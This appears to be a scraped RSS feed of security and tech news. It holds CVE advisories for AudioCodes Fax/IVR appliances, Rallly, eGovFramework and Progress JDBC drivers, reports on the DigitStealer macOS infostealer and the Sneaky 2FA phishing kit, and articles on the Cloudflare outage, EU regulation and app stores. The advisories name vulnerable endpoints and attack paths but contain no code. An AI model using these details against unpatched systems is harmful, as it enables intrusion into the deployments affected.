Rallly is an open-source scheduling and collaboration tool. Prior to version 4.5.4, an authorization flaw in the poll management feature allows any authenticated user to pause or resume any poll, regardless of ownership. The system only uses the public pollId to identify polls, and it does not verify whether the user performing the action is the poll owner. As a result, any user can disrupt polls created by others, leading to a loss of integrity and availability across the application. This issue has been patched in version 4.5.4.

AudioCodes Fax Server and Auto-Attendant IVR appliances versions up to and including 2.6.23 are vulnerable to an authenticated command injection in the fax test functionality implemented by AudioCodes_files/TestFax.php. When a fax "send" test is requested, the application builds a faxsender command line using attacker-supplied parameters and passes it to GlobalUtils::RunBatchFile without proper validation or shell-argument sanitization. The resulting batch file is written into a temporary run directory and then executed via a backend service that runs as NT AUTHORITY\\SYSTEM. An authenticated attacker with access to the fax test interface can craft parameter values that inject additional shell commands into the generated batch file, leading to arbitrary command execution with SYSTEM privileges. In addition, because the generated batch files reside in a location with overly permissive file system permissions, a local low-privilege user on the server can modify pending batch files to achieve the same elevation.

It avoids detection, skips older devices, and steals files, passwords, and browser data. We break down what it does and how to protect your Mac.Researchers have described a new malware called DigitStealer that steals sensitive information from macOS users.This variant comes with advanced detection-evasion techniques and a multi-stage attack chain. Most infostealers go after the same types of data and use similar methods to get it, but DigitStealer is different enough to warrant attention.A few things make it stand out: platform-specific targeting, fileless operation, and anti-analysis techniques. Together, they pose relatively new challenges for Mac users.The attack starts with a file disguised as a utility app called “DynamicLake,” which is hosted on a fake website rather than the legitimate company’s site. To trick users, it instructs you to drag a file into Terminal, which will initiate the download and installation of DigitStealer.If your system matches certain regions or is a virtual machine, the malware won’t run. That’s likely to hinder analysis by researchers and to steer clear of infecting people in its home country, which is enough in some countries to stay out of prison. It also limits itself to devices with newer ARM features introduced with M2 chips or later. chips, skipping older Macs, Intel-based chips, and most virtual machines.The attack chain is largely fileless so it won’t leave many traces behind on an affected machine. Unlike file-based attacks that execute the payload in the hard drive, fileless attacks execute the payload in Random Access Memory (RAM). Running malicious code directly in the memory instead of the hard drive has several advantages for attackers:Evasion of traditional security measures: Fileless attacks bypass antivirus software and file-signature detection, making them harder to identify using conventional security tools.   Since fileless attacks don’t create files, they can be more challenging to remove once detected. This can make it extra tricky for forensics to trace an attack back to the source and restore the system to a secure state.DigitStealer’s initial payload asks for your password and tries to steal documents, notes, and files. If successful, it uploads them to the attackers’ servers.The second stage of the attack goes after browser information from Chrome, Brave, Edge, Firefox and others, as well as keychain passwords, crypto wallets, VPN configurations (specifically OpenVPN and Tunnelblick), and Telegram sessions.DigitStealer shows how Mac malware keeps evolving. It’s different from other infostealers, splitting its attack into stages, targeting new Mac hardware, and leaving barely any trace.But you can still protect yourself:Always be careful what you run in Terminal. Don’t follow instructions from unsolicited messages.Be careful where you download apps from.Keep your software, especially your operating system and your security defenses, up to date.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>CVE-2025-34332 - AudioCodes Fax/IVR Appliance &lt;= 2.6.23 Insecure Service Control Scripts LPE</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34332</link><author></author><category>vulns</category><pubDate>Wed, 19 Nov 2025 16:23:27 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34332

When certain service actions are requested through ajaxPost.php, these scripts are invoked by PHP using system() under the NT AUTHORITY\\SYSTEM account. The batch files in this directory are writable by any authenticated local user due to overly permissive ACLs, allowing them to replace script contents with arbitrary commands. On the next service start/stop operation, the modified script is executed as SYSTEM, enabling elevation of local privileges.

 Nov. 19, 2025, 5:15 p.m. | 4 hours, 3 minutes ago
AudioCodes Fax Server and Auto-Attendant IVR appliances versions up to and including 2.6.23 expose an unauthenticated backup upload endpoint at AudioCodes_files/ajaxBackupUploadFile.php in the F2MAdmin web interface. The script derives a backup folder path from application configuration, creates the directory if it does not exist, and then moves an uploaded file to that location using the attacker-controlled filename, without any authentication, authorization, or file-type validation. On default Windows deployments where the backup directory resolves to the system drive, a remote attacker can upload web server or interpreter configuration files that cause a log file or other server-controlled resource to be treated as executable code. This allows subsequent HTTP requests to trigger arbitrary command execution under the web server account, which runs as NT AUTHORITY\\SYSTEM.

AudioCodes Fax Server and Auto-Attendant IVR appliances versions up to and including 2.6.23 contain an unauthenticated file read vulnerability via the download.php script. The endpoint exposes a file download mechanism that lacks access control, allowing remote, unauthenticated users to request files stored on the appliance based solely on attacker-supplied path and filename parameters. While limited to specific file extensions permitted by the application logic, sensitive backup archives can be retrieved, exposing internal databases and credential hashes. Successful exploitation may lead to disclosure of administrative password hashes and other sensitive configuration data.

AudioCodes Fax Server and Auto-Attendant IVR appliances versions up to and including 2.6.23 include a web administration component (F2MAdmin) that exposes an unauthenticated script-management endpoint at AudioCodes_files/utils/IVR/diagram/ajaxScript.php. The saveScript action writes attacker-supplied data directly to a server-side file path under the privileges of the web service account, which runs as NT AUTHORITY\\SYSTEM on Windows deployments. A remote, unauthenticated attacker can write arbitrary files into the product’s web-accessible directory structure and subsequently execute them.

 Nov. 19, 2025, 5:15 p.m. | 4 hours, 3 minutes ago
eGovFramework/egovframe-common-components versions up to and including 4.3.1 includes Web Editor image upload and related file delivery functionality that uses symmetric encryption to protect URL parameters, but exposes an encryption oracle that allows attackers to generate valid ciphertext for chosen values. The image upload endpoints /utl/wed/insertImage.do and /utl/wed/insertImageCk.do encrypt server-side paths, filenames, and MIME types and embed them directly into a download URL that is returned to the client. Because these same encrypted parameters are trusted by other endpoints, such as /utl/web/imageSrc.do and /cmm/fms/getImage.do, an unauthenticated attacker can abuse the upload functionality to obtain encrypted representations of attacker-chosen identifiers and then replay those ciphertext values to file-serving APIs. This design failure allows an attacker to bypass access controls that rely solely on the secrecy of encrypted parameters and retrieve arbitrary stored files that are otherwise expected to require an existing session or specific authorization context. KISA/KrCERT has identified this unpatched vulnerability as "KVE-2023-5281."

Improper Control of Generation of Code ('Code Injection') vulnerability in Progress DataDirect Connect for JDBC drivers, Progress DataDirect Open Access JDBC driver and Hybrid Data Pipeline allows Remote Code Inclusion.


The SpyAttribute connection option implemented by the DataDirect Connect for JDBC drivers, DataDirect Hybrid Data Pipeline JDBC driver and the DataDirect OpenAccess JDBC driver supports an undocumented syntax construct for the option value that if discovered can be used by an attacker.  If an application allows an end user to specify a value for the SpyAttributes connection option then an attacker can use the undocumented syntax to cause the driver to load an arbitrary class on the class path and execute a constructor on that class.

Under intense pressure from industry and the US government, Brussels is stripping protections from its flagship General Data Protection Regulation (GDPR) — including simplifying its infamous cookie permission pop-ups — and relaxing or delaying landmark AI rules in an effort to cut red tape and revive sluggish economic growth.The changes, proposed by the European Commission, the bloc’s executive branch, changes core elements of the GDPR, making it easier for companies to share anonymized and pseudonymized personal datasets. They would allow AI companies to legally use personal data to train AI models, so long as that training complies with other GDPR requirements.The proposal also waters down a key part of Europe’s sweeping artificial intelligence rules, the AI Act, which came into force in 2024 but had many elements that would only come into effect later. The change extends the grace period for rules governing high-risk AI systems that pose “serious risks” to health, safety, or fundamental rights, which were due to come into effect next summer. The rules will now only apply once it’s confirmed that “the needed standards and support tools are available” to AI companies.One change that’s likely to please almost everyone is a reduction in Europe’s ubiquitous cookie banners and pop-ups. Under the new proposal, some “non-risk” cookies won’t trigger pop-ups at all, and users would be able to control others from central browser controls that apply to websites broadly.Other amendments in the new Digital Omnibus include simplified AI documentation requirements for smaller companies, a unified interface for companies to report cybersecurity incidents, and centralizing oversight of AI into the bloc’s AI Office.“This is being done in the European way.”“We have all the ingredients in the EU to succeed. But our companies, especially our start-ups and small businesses, are often held back by layers of rigid rules,” said Henna Virkkunen, executive vice-president for tech sovereignty at the European Commission. “By cutting red tape, simplifying EU laws, opening access to data and introducing a common European Business Wallet we are giving space for innovation to happen and to be marketed in Europe. This is being done in the European way: by making sure that fundamental rights of users remain fully protected.”The proposal now heads to the European Parliament and the EU’s 27 member states — where it will need a qualified majority — for approval, a process that could drag on for months and potentially introduce significant changes.The proposed overhaul won’t land quietly in Brussels, and if the development of the GDPR and AI Act are anything to go by, a political and lobbying firestorm is on its way. The GDPR is a cornerstone of Europe’s tech strategy and as close to sacred as a policy can be. Leaked drafts have already provoked outrage among civil rights groups and politicians, who have accused the Commission of weakening fundamental safeguards and bowing to pressure from Big Tech.The decision follows months of intense pressure from Big Tech and Donald Trump — as well as high-profile internal figures like ex-Italian prime minister and former head of the European Central Bank Mario Draghi — urging the bloc to weaken burdensome tech regulation. The Commission has sought to frame the changes as simplifying the EU’s tech laws, not weakening them – a way of soothing growing fears in Brussels that its tough rules are hampering its ability to compete globally. With very few exceptions, Europe doesn’t have any credible competitors in the global AI race, which is dominated by US and Chinese companies like DeepSeek, Google, and OpenAI.]]></content:encoded></item><item><title>New WrtHug campaign hijacks thousands of end-of-life ASUS routers</title><link>https://www.bleepingcomputer.com/news/security/new-wrthug-campaign-hijacks-thousands-of-end-of-life-asus-routers/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 19 Nov 2025 14:35:15 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Thousands of ASUS WRT routers, mostly end-of-life or outdated devices, have been hijacked in a global campaign called Operation WrtHug that exploits six vulnerabilities.

Some affected Cloudflare customers were able to pivot away from the platform temporarily so that visitors could still access their websites. But security experts say doing so may have also triggered an impromptu network penetration test for organizations that have come to rely on Cloudflare to block many types of abusive and malicious traffic.At around 6:30 EST/11:30 UTC on Nov. 18, Cloudflare’s status page acknowledged the company was experiencing “an internal service degradation.” After several hours of Cloudflare services coming back up and failing again, many websites behind Cloudflare found they could not migrate away from using the company’s services because the Cloudflare portal was unreachable and/or because they also were getting their domain name system (DNS) services from Cloudflare.However, some customers did manage to pivot their domains away from Cloudflare during the outage. And many of those organizations probably need to take a closer look at their web application firewall (WAF) logs during that time, said , a faculty member at .Turner said Cloudflare’s WAF does a good job filtering out malicious traffic that matches any one of the top ten types of application-layer attacks, including credential stuffing, cross-site scripting, SQL injection, bot attacks and API abuse. But he said this outage might be a good opportunity for Cloudflare customers to better understand how their own app and website defenses may be failing without Cloudflare’s help.“Your developers could have been lazy in the past for SQL injection because Cloudflare stopped that stuff at the edge,” Turner said. “Maybe you didn’t have the best security QA [quality assurance] for certain things because Cloudflare was the control layer to compensate for that.”Turner said one company he’s working with saw a huge increase in log volume and they are still trying to figure out what was “legit malicious” versus just noise.“It looks like there was about an eight hour window when several high-profile sites decided to bypass Cloudflare for the sake of availability,” Turner said. “Many companies have essentially relied on Cloudflare for the OWASP Top Ten [web application vulnerabilities] and a whole range of bot blocking. How much badness could have happened in that window? Any organization that made that decision needs to look closely at any exposed infrastructure to see if they have someone persisting after they’ve switched back to Cloudflare protections.”Turner said some cybercrime groups likely noticed when an online merchant they normally stalk stopped using Cloudflare’s services during the outage.“Let’s say you were an attacker, trying to grind your way into a target, but you felt that Cloudflare was in the way in the past,” he said. “Then you see through DNS changes that the target has eliminated Cloudflare from their web stack due to the outage. You’re now going to launch a whole bunch of new attacks because the protective layer is no longer in place.”, senior product marketing manager at the McLean, Va. based , called yesterday’s outage “a free tabletop exercise, whether you meant to run one or not.”“That few-hour window was a live stress test of how your organization routes around its own control plane and shadow IT blossoms under the sunlamp of time pressure,” Scott said in a post on LinkedIn. “Yes, look at the traffic that hit you while protections were weakened. But also look hard at the behavior inside your org.”Scott said organizations seeking security insights from the Cloudflare outage should ask themselves:1. What was turned off or bypassed (WAF, bot protections, geo blocks), and for how long?
2. What emergency DNS or routing changes were made, and who approved them?
3. Did people shift work to personal devices, home Wi-Fi, or unsanctioned Software-as-a-Service providers to get around the outage?
4. Did anyone stand up new services, tunnels, or vendor accounts “just for now”?
5. Is there a plan to unwind those changes, or are they now permanent workarounds?
6. For the next incident, what’s the intentional fallback plan, instead of decentralized improvisation?In a postmortem published Tuesday evening, Cloudflare said the disruption was not caused, directly or indirectly, by a cyberattack or malicious activity of any kind.“Instead, it was triggered by a change to one of our database systems’ permissions which caused the database to output multiple entries into a ‘feature file’ used by our Bot Management system,” Cloudflare CEO  wrote. “That feature file, in turn, doubled in size. The larger-than-expected feature file was then propagated to all the machines that make up our network.”Cloudflare estimates that roughly 20 percent of websites use its services, and with much of the modern web relying heavily on a handful of other cloud providers including  and , even a brief outage at one of these platforms can create a single point of failure for many organizations., CEO at the IT consultancy , said Tuesday’s outage was another reminder that many organizations may be putting too many of their eggs in one basket.“There are several practical and overdue fixes,” Greenfield advised. “Split your estate. Spread WAF and DDoS protection across multiple zones. Use multi-vendor DNS. Segment applications so a single provider outage doesn’t cascade. And continuously monitor controls to detect single-vendor dependency.”]]></content:encoded></item><item><title>CISA gives govt agencies 7 days to patch new Fortinet flaw</title><link>https://www.bleepingcomputer.com/news/security/cisa-gives-govt-agencies-7-days-to-patch-new-fortinet-flaw/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 19 Nov 2025 13:44:56 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[CISA has ordered U.S. government agencies to secure their systems within a week against another vulnerability in Fortinet's FortiWeb web application firewall, which was exploited in zero-day attacks.

What happens when your device can only run what the government decides is OK? We are dangerously close to this kind of totalitarian control, thanks to a combination of government overreach and technocratic infrastructure choices.Most Americans have a smartphone, and the average American spends over 5 hours a day on their phone. While these devices are critical to most people’s daily lives, what they can actually do is shaped by what apps are readily available. A slim majority of American smartphone users use an iPhone, which means they can only install apps available from Apple’s AppStore. Nearly all the rest of US smartphone users use some variant of Android, and by default they get their apps from Google’s Play Store.Collectively, these two app stores shape the universe of what is available to most people as they use the Internet and make their way through their daily lives. When those app stores block or limit apps based on government requests, they are shaping what people can do, say, communicate, and experience.Recently, Apple pulled an app called ICEBlock from the AppStore, making it unavailable in one fell swoop. This app was designed to let people anonymously report public sightings of ICE agents. In the United States people absolutely have a First Amendment right to inform others about what they have seen government officials doing and where — very much including immigration agents whose tactics have been controversial and violent. Apple pulled the ICEBlock app at the demand of the US Department of Justice. The following day, Google pulled a similar app called Red Dot from the Google Play Store.The DOJ’s pressuring of Apple is an unacceptable, censorious overreach. And Google’s subsequent removal of Red Dot looks like troubling premature capitulation. While some experts and activists have expressed concerns over ICEBlock’s design and development practices, those concerns are no reason for the government to meddle in software distribution. The administration’s ostensible free speech warriors are trying to shape how Americans can communicate with each other about matters of pressing political concern.
But the government’s overreach isn’t the whole story here. The current structure of the mobile phone ecosystem enables this kind of abuse and control.Apple’s iOS (the operating system for any iPhone) is designed to only be able to run apps from the AppStore. If Apple hasn’t signed off on it, the app won’t run. This centralized control is ripe for abuse:Apple’s guidelines say that “‘Enemies’ within the context of a game cannot solely target a specific … government, corporation, or any other real entity.” That represents a potential for sweeping censorship of anyone who wants to use the art of games to criticize companies or otherwise advance political messages.It banned the popular game Fortnite from the App Store as it was battling the gamemaker to get a bigger cut of money from user transactions.In 2012 Apple rejected an app that compiled reports of highly controversial overseas drone strikes by the U.S. government during the “War on Terror.”Unlike Apple, Google’s Android operating system has traditionally allowed relatively easy access to “sideloading”, which just means installing apps through means other than Google’s Play Store. Although most installations default to getting apps from the Play Store, the availability of sideloading means that even if Google censors apps in the Play Store, people can still install them. Even apps critical of Google can make it onto an Android device. It’s also possible to run a variant of Android without the Play Store at all, such as GrapheneOS.Unfortunately that is all set to change with a recent Google announcement that it will block apps from “certified Android” devices (which is nearly all Android phones) unless they come from what Google calls a “verified developer.” This means that the common Android user trying to install an app will have to get Google’s blessing: does this app come from someone that Google has “verified”? How Google will decide who is allowed to be verified and who is not is still unclear. Can a developer become “unverified”?This upcoming change is framed by Google as a security measure, but merely knowing the identity of the developer of an app doesn’t provide any security. So the only way that the “verified developer” requirement can offer security is if Google withholds “verified developer” status from people it deems bad actors. But Google’s ability to withhold that status can be abused in the same way that Apple’s AppStore lock-in is being abused. A government will simply make a demand: “treat this developer as a bad actor” and effectively cut off any app by targeting its developer.When a lever of control is available, the would-be censors will try to use it. It has never been true that someone who buys a Lenovo or Dell laptop, for example, has to let Lenovo or Dell tell them what programs they can and cannot install on their computer. Yet that will soon be the situation with regards to nearly all cell phones used in the United States.Note that American iPhones are limited to only apps from the AppStore, but European Union (EU) iPhones don’t have that restriction. The EU’s Digital Markets Act (DMA) required Apple to permit alternate app stores and sideloading (which Apple calls “web distribution”). As a result, marketplaces like AltStore are starting to become available — but Apple only lets EU customers use them. The European regime is not perfect, however; while sideloaded apps and alternative app stores aren’t subject to the app store’s constraints, they are still obliged to follow Apple’s “Notarization” requirements, which requires Apple to review all iOS apps – even from these alternate sources – on the basis of several vaguely worded rationales. For example, if the DoJ were to claim that ICEBlock “promoted physical harm” (even though it clearly does not), Apple could use this as an excuse to justify revoking their notarization of the app, which would prevent it from being installed even from these alternate channels.App store security and surveillance
Both Apple and Google make claims that their app distribution mechanisms improve security for their users. And clearly, these tech giants do block some abusive apps by exercising the control they have.But both of them also regularly allow apps that contain common malicious patterns, including many apps built with surveillance tooling that sell their users’ data to data brokers. If either tech giant were serious about user security, they could ban these practices, but they do not. Google’s security claims are also undermined by the fact that the cellphone hacking company Cellebrite tells law enforcement that Google’s Pixel phones can be hacked, while those running GrapheneOS, created by a small non-profit, cannot. (Asked by a reporter why that was so, Google did not respond.)Making matters worse, organizations like Google are unclear about their policies, and some of their policy statements can put developers and users at risk. Discussing blocking Red Dot, for example, Google told 404Media that “apps that have user generated content must also conduct content moderation.” This implies that Google could become unwilling to distribute fully end-to-end encrypted apps, like Signal Private Messenger or Delta Chat, since those app vendors by design are incapable of reviewing user-generated content. End-to-end encrypted apps are the gold standard for secure communications, and no app store that signals a willingness to remove them can claim to put security first.In addition, even if you’ve carefully curated the apps you have installed from these dominant app stores to avoid spyware and use strongly secure apps, the stores themselves monitor the devices, keeping dossiers of what apps are installed on each device, and maybe more. Being a user of these app stores means being under heavy, regular surveillance.These centralized, surveilled, censorship-enabling app stores are not the only way to distribute software. Consider alternative app stores for Android, like Accrescent, which prioritizes privacy and security requirements in its apps, and F-Droid, which enables installation of free and open source apps. In addition to offering quality tools and auditing, F-Droid’s policies incentivize the apps distributed on the platform to trim out overwhelming amounts of corporate spyware that infest both Google and Apple’s app stores. Neither F-Droid nor Accrescent do any surveillance of their users at all.The F-Droid developers recently wrote about the impact that Google’s upcoming developer registration requirements are likely to have on the broader ecosystem of privacy-preserving Android apps. The outcome doesn’t look good: the ability to install free and open source software on a common device might be going away. Those few people left using unusual devices (“uncertified” Android deployments like GrapheneOS, or even more obscure non-Android operating systems like phosh) will still have the freedom to install tools that they want, but the overwhelming majority of people will be stuck with what can quickly devolve into a government-controlled cop-in-your-pocket.In an increasingly centralized world, it will take very little for an abusive government to cause an effective organizing tool to disappear, to block an app that belongs to a critical dissenting media outlet, or to force invasive malware into a software update used by everyone. We need a shared infrastructure that doesn’t permit this kind of centralized control. We can disrupt oligopolistic control over software through user choice (e.g., preferring and installing free software), building good protocol frameworks (e.g., demanding tools that use open standards for interoperability), and through regulatory intervention (e.g., breaking up monopolistic actors, or mandating that an OS must allow sideloading, as the EU did with the DMA).The device you carry with you that is privy to much of your life should be under your control, not under the control of an abusive government or corporations that do its bidding.]]></content:encoded></item><item><title>Larry Summers resigns from OpenAI board</title><link>https://www.cnbc.com/2025/11/19/larry-summers-epstein-openai.html</link><author>koolba</author><category>dev</category><pubDate>Wed, 19 Nov 2025 13:16:23 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Larry Summers, president emeritus and professor at Harvard University, at the World Economic Forum (WEF) in Davos, Switzerland, on Tuesday, Jan. 21, 2025. Stefan Wermuth | Bloomberg | Getty ImagesEarlier Wednesday, Summers said that he will resign from the board of OpenAI.Harvard on Wednesday had said it would investigate Summers' relationship with Epstein in light of the disclosure of their emails.Summers is a former president of Harvard. He is the director of the  Mossavar-Rahmani Center for Business and Government at the Harvard Kennedy School.His spokesman, Steven Goldberg, in a statement Wednesday night said, "Mr. Summers has decided it's in the best interest of the Center for him to go on leave from his role as Director as Harvard undertakes its review.""His co-teachers will complete the remaining three class sessions of the courses he has been teaching with them this semester, and he is not scheduled to teach next semester," Goldberg said.A Harvard spokesman, in a statement to The Crimson, the student newspaper, said that Harvard is "conducting a review of information concerning individuals at Harvard included in the newly released Jeffrey Epstein documents to evaluate what actions may be warranted."Summers had announced on Monday that he would be stepping back from all public commitments, but that he would continue teaching classes at Harvard. He was mum until Wednesday about remaining on the board of directors at the artificial intelligence startup OpenAI."I am grateful for the opportunity to have served, excited about the potential of the company, and look forward to following their progress," Summers said in a statement to CNBC confirming he resignation.OpenAI's board told CNBC it respects Summers' decision to resign."We appreciate his many contributions and the perspective he brought to the Board," the OpenAI board of directors said in a statement.Details of Summers' correspondence with Epstein were made public last week after the House Oversight and Government Reform Committee released more than 20,000 documents it obtained pursuant to a subpoena from Epstein's estate. Summers has faced intense scrutiny following the release of those files. Summers joined OpenAI's board in 2023 during a turbulent period for the startup. OpenAI CEO Sam Altman was briefly ousted from the company, though he returned to the chief executive role days later. In the wake of "The Blip," as some OpenAI employees call it, Summers was appointed to the board alongside Bret Taylor, former co-CEO of , and Quora CEO Adam D'Angelo, who was the only member of OpenAI's previous board who still held a seat.Axios was first to report Summers' resignation from the board. ]]></content:encoded></item><item><title>Meet ShinySp1d3r: New Ransomware-as-a-Service created by ShinyHunters</title><link>https://www.bleepingcomputer.com/news/security/meet-shinysp1d3r-new-ransomware-as-a-service-created-by-shinyhunters/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Wed, 19 Nov 2025 13:01:09 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[An in-development build of the upcoming ShinySp1d3r ransomware-as-a-service platform has surfaced, offering a preview of the upcoming extortion operation.

These “Browser-in-the-Browser” attacks can fool almost anyone, but a password manager and a few simple habits can keep you safe.Phishing attacks continue to evolve, and one of the more deceptive tricks in the attacker’s arsenal today is the Browser-in-the-Browser (BitB) attack. At its core, BitB is a social engineering technique that makes users believe they’re interacting with a genuine browser pop-up login window when, in reality, they’re dealing with a convincing fake built right into a web page.Researchers recently found a Phishing-as-a-Service (PhaaS) kit known as “Sneaky 2FA” that’s making these capabilities available on the criminal marketplace. Customers reportedly receive a licensed, obfuscated version of the source code and can deploy it however they like.Attackers use this kit to create a fake browser window using HTML and CSS. It’s very deceptive because it includes a perfectly rendered address bar showing the legitimate website’s URL. From a user’s perspective, everything looks normal: the window design, the website address, even the login form. But it’s a carefully crafted illusion designed to steal your username and password the moment you start typing.Normally we tell people to check whether the URL in the address bar matches your expectations, but in this case that won’t help. The fake URL bar can fool the human eye, it can’t fool a well-designed password manager. Password managers are built to recognize only the legitimate browser login forms, not HTML fakes masquerading as browser windows. This is why using a password manager consistently matters. It not only encourages strong, unique passwords but also helps spot inconsistencies by refusing to autofill on suspicious forms.Sneaky 2FA uses various tricks to avoid detection and analysis. For example, by preventing security tools from accessing the phishing pages: the phishers redirect unwanted visitors to harmless sites and show the BitB page only to high-value targets. For those targets the pop-up window adapts to match each visitor’s operating system and browser.The domains the campaigns use are also short-lived. Attackers “burn and replace” them to stay ahead of blocklists. Which makes it hard to block these campaigns based on domain names.As always, you’re the first line of defense. Don’t click on links in unsolicited messages of any type before verifying and confirming they were sent by someone you trust. Staying informed is important as well, because you know what to expect and what to look for.And remember: it’s not just about trusting what you see on the screen. Layered security stops attackers before they can get anywhere.Another effective security layer to defend against BitB attacks is Malwarebytes’ free browser extension, Browser Guard, which detects and blocks these attacks heuristically.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

This is the talk.Thirty years ago, a debate raged over whether vulnerability disclosure was good for computer security. On one side, full disclosure advocates argued that software bugs weren’t getting fixed and wouldn’t get fixed if companies that made insecure software wasn’t called out publicly. On the other side, companies argued that full disclosure led to exploitation of unpatched vulnerabilities, especially if they were hard to fix. After blog posts, public debates, and countless mailing list flame wars, there emerged a compromise solution: coordinated vulnerability disclosure, where vulnerabilities were disclosed after a period of confidentiality where vendors can attempt to fix things. Although full disclosure fell out of fashion, disclosure won and security through obscurity lost. We’ve lived happily ever after since.Or have we? The move towards paid bug bounties and the rise of platforms that manage bug bounty programs for security teams has changed the reality of disclosure significantly. In certain cases, these programs require agreement to contractual restrictions. Under the status quo, that means that software companies sometimes funnel vulnerabilities into bug bounty management platforms and then condition submission on confidentiality agreements that can prohibit researchers from ever sharing their findings.In this talk, I’ll explain how confidentiality requirements for managed bug bounty programs restrict the ability of those who attempt to report vulnerabilities to share their findings publicly, compromising the bargain at the center of the CVD process. I’ll discuss what contract law can tell us about how and when these restrictions are enforceable, and more importantly, when they aren’t, providing advice to hackers around how to understand their legal rights when submitting. Finally, I’ll call upon platforms and companies to adapt their practices to be more in line with the original bargain of coordinated vulnerability disclosure, including by banning agreements that require non-disclosure.And this is me from 2007, talking about “responsible disclosure”:This was a good idea—and these days it’s normal procedure—but one that was possible only because full disclosure was the norm. And it remains a good idea only as long as full disclosure is the threat.]]></content:encoded></item><item><title>Multiple Vulnerabilities in D-Link EoL/EoS Routers Allows Remote Code Execution Attacks</title><link>https://cybersecuritynews.com/d-link-eol-eos-router-vulnerabilities/</link><author></author><category>security</category><pubDate>Wed, 19 Nov 2025 12:04:05 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

From the time they’re tiny, we share photos, moments, and milestones online—proud parent stuff! Schools, friends, and family all get involved too. Before we know it, our kids have a whole digital history they didn’t even know they were building. Unlike footprints at the beach, this trail never washes away. That habit even has a name now: . It’s when parents share details of their child’s life online, often without realizing how public or permanent those posts can become. Think of your child’s digital footprint as the trail they (and you) leave across the internet. It includes every photo, post, comment, and account, plus all the data quietly collected behind the scenes. There are two sides to it:  what you or your child share directly, such as photos, TikTok videos, usernames, or status updates. Even “private” posts can be screenshot or reshared.  what gets collected automatically. Cookies, location data, and app activity quietly build profiles of who your child is and what they do. Both add up to a digital version of your child that can stick around for years. For kids and teens, their online presence shapes how the world sees them—friends, teachers, even future employers. But it also creates risks:  once something’s online, it can be copied or mocked.  colleges and jobs may see old posts that no longer reflect who they are.  oversharing locations or routines can make it easier for strangers to find or trick them.  birthdates, school names, and addresses can help criminals create fake identities. Practicing good digital hygiene keeps those risks small. Kids don’t need social media accounts to leave data behind. Gaming platforms, smartwatches, school apps, and even voice assistants collect fragments of personal information. That innocent photo from a class project might live in a public gallery. A leaderboard can display a real name or score history. Even nicknames or in-game chat can expose more than intended. Help your kids check what’s visible publicly and what isn’t. How sharenting can make it worse Don’t worry, I’ve done some of these too! We love to share and celebrate our kids, but sometimes we give away more than we mean to: Posting full names, birthdays, and locations on open social media. Sharing photos with school logos, house numbers, or nearby landmarks visible. Leaving geotagging or location data on by accident (it’s scary how precise this can be). Talking about routines, worries, or personal struggles in public forums. Forgetting to clean up old posts as our kids get bigger. And it’s easy to forget about all those apps we sign up to “just to try it”. They might be collecting info in the background, too. Two real-life sharenting stories Karen loves her son, Max. She posts his awards, soccer games, and milestones online, sometimes tagging the school or leaving her phone’s location on. It’s innocent… until someone strings the details together. A fake gamer profile messages Max: “Hey, don’t you go to Graham Elementary? I saw your soccer pics!” Suddenly, a friendly chat feels personal and real. Karen meant well, but her posts created a map for someone else to follow. Then there’s the story we covered of a mother in Florida who picked up the phone to hear her daughter sobbing. She’d been in a car accident, hit a pregnant woman, and needed bail money right away. The voice sounded exactly like her child. Terrified, she followed the caller’s instructions and handed over $15,000. Only later did she learn her daughter had been safe at work the whole time. Scammers had used AI to clone her voice from a short online video. It’s a chilling reminder that even something as ordinary as a video or social post can become fuel for manipulation. Simple steps parents can take  before you post, ask, “Would I be OK with a stranger seeing this?”  teach privacy basics early and update as they grow.  review privacy settings together on both your accounts.  encourage nicknames for games or public forums.  set boundaries for what’s OK to share.  remove automatic location data from photos. Know what to do if something goes wrong Everyone messes up online sometimes. It happens to the best of us. We’ve all shared something we wish we hadn’t. The goal isn’t to scare our kids (or ourselves) away from the internet, but to help them feel confident, safe, and smart about it all. If your child ever feels uncomfortable or gets into a sticky situation online: Stay calm and let them know you are safe to talk to. Keep record of any sketchy messages or harassment. Use blocking, reporting, and privacy tools. Loop in school counselors or other trusted adults if you need backup. If there’s a real threat or criminal activity, contact the proper authorities. The online world is always changing, and honestly, we’re all learning as we go. But by staying curious, keeping the lines open, and setting a good example yourself, you’ll help your kids build a digital life they can be proud of. Let’s look out for each other. If you’ve got thoughts or tips about sharenting and online safety, do share them with me. You can message me on Linkedin at https://www.linkedin.com/in/mattburgess/. We’re all in this together. We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline.

These changes affected all sections of the report except for the statistics on installation packages, which remained unchanged.To illustrate the differences between the reporting periods, we have also recalculated data for the previous quarters. Consequently, these figures may significantly differ from the previously published ones. However, subsequent reports will employ this new methodology, enabling precise comparisons with the data presented in this post.The Kaspersky Security Network (KSN) is a global network for analyzing anonymized threat information, voluntarily shared by users of Kaspersky solutions. The statistics in this report are based on KSN data unless explicitly stated otherwise.According to Kaspersky Security Network, in Q3 2025:47 million attacks utilizing malware, adware, or unwanted mobile software were prevented.Trojans were the most widespread threat among mobile malware, encountered by 15.78% of all attacked users of Kaspersky solutions.More than 197,000 malicious installation packages were discovered, including:
